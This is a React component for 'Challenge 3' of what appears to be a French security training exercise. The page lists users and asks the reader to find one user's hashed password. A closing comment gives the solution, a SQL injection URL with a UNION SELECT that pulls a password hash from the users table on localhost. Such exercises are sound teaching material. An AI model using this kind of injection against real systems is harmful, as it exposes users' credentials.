import React, { useEffect, useState } from "react"
import { Link } from "react-router-dom";
import { getUsers } from "../../api";

export { Challenge3 }

type userType = { id: number, name: string }

function Challenge3() {
    const [users, setUsers] = useState<userType[]>([]);

    useEffect(() => {
        getUsers().then(({ data }) => {
            if (data) {
                setUsers(data as userType[])
            }
        })
    }, [])

    return <>
        <header>Challenge 3</header>
        <p>Pour ce challenge, il s'agit de trouver le mot de passe hach√© de M. Lermite</p>
        ---------------------------
        <ul>
            {users.map((user, index) => <li key={user.name + index}><Link to={`/challenge3/users/${user.id}`}>{user.name}</Link></li>)}
        </ul>
    </>

}

// Solution : http://localhost:3001/api/users/16%20UNION%20SELECT%20id,%20hashedPassword%20FROM%20users%20WHERE%20id=15